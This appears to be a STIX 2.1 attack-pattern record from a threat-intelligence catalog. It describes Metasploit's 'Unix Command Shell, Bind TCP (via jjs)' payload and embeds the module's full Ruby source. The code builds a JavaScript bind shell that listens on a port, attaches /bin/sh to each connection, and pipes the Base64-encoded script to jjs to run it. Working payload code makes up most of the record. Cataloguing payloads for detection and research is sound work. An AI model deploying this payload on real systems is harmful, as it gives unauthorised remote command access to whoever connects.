{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7504332b-61c5-4634-9aec-8d109cfb8e9a",
    "created": "2024-08-14T16:33:19.318109Z",
    "modified": "2024-08-14T16:33:19.318113Z",
    "name": "Unix Command Shell, Bind TCP (via jjs)",
    "description": "Listen for a connection and spawn a command shell via jjs",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/bind_jjs.rb",
            "external_id": "bind_jjs.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gtfobins.github.io/gtfobins/jjs/"
        },
        {
            "source_name": "reference",
            "url": "https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/"
        },
        {
            "source_name": "reference",
            "url": "https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 795\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'        => 'Unix Command Shell, Bind TCP (via jjs)',\n     'Description' => 'Listen for a connection and spawn a command shell via jjs',\n     'Author'      => [\n       'conerpirate', # jjs bind shell\n       'bcoles'       # metasploit\n     ],\n     'References'    => [\n       ['URL', 'https://gtfobins.github.io/gtfobins/jjs/'],\n       ['URL', 'https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/'],\n       ['URL', 'https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html'],\n     ],\n     'License'     => MSF_LICENSE,\n     'Platform'    => 'unix',\n     'Arch'        => ARCH_CMD,\n     'Handler'     => Msf::Handler::BindTcp,\n     'Session'     => Msf::Sessions::CommandShell,\n     'PayloadType' => 'cmd',\n     'RequiredCmd' => 'jjs',\n     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n    register_options(\n      [\n        OptString.new('SHELL', [ true, 'The shell to execute', '/bin/sh' ])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('JJSPath', [true, 'The path to the JJS executable', 'jjs'])\n      ]\n    )\n  end\n\n  def generate(_opts = {})\n    return super + command_string\n  end\n\n  def command_string\n    jcode = %Q{\n      var ss=new java.net.ServerSocket(#{datastore['LPORT']});\n      while(true){\n        var s=ss.accept();\n        var p=new java.lang.ProcessBuilder(\"#{datastore['SHELL']}\").redirectErrorStream(true).start();\n        var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n        var po=p.getOutputStream(),so=s.getOutputStream();\n        while(!s.isClosed()){\n          while(pi.available()>0)so.write(pi.read());\n          while(pe.available()>0)so.write(pe.read());\n          while(si.available()>0)po.write(si.read());\n          so.flush();\n          po.flush();\n          java.lang.Thread.sleep(50);\n          try{p.exitValue();break;}catch(e){}\n        };\n        p.destroy();s.close();ss.close();\n      }\n    }\n\n    minified = jcode.split(\"\\n\").map(&:lstrip).join\n\n    %Q{echo \"eval(new java.lang.String(java.util.Base64.decoder.decode('#{Rex::Text.encode_base64(minified)}')));\"|#{datastore['JJSPath']}}\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}